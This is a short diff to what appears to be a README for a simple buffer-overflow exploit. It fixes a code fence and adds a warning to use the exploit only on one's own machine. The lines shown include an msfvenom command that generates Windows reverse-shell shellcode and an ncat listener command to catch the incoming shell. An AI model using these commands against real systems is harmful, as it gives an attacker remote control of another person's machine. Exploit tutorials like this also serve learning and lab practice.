@@ -7,4 +7,5 @@ That easy BoF overwrite the buffer and the EIP and execute the shellcode that wi
 ## Repleace the shellcode with your own!!
 ````~$ sudo ./msfvenom windows/shell_reverse_tcp LHOST=<your ip> LPORT=4444````
 ## Launch netcat 
-````~$ ncat -lvp <shellcode port>
+````~$ ncat -lvp <shellcode port>````
+## Use only on your own machine!!
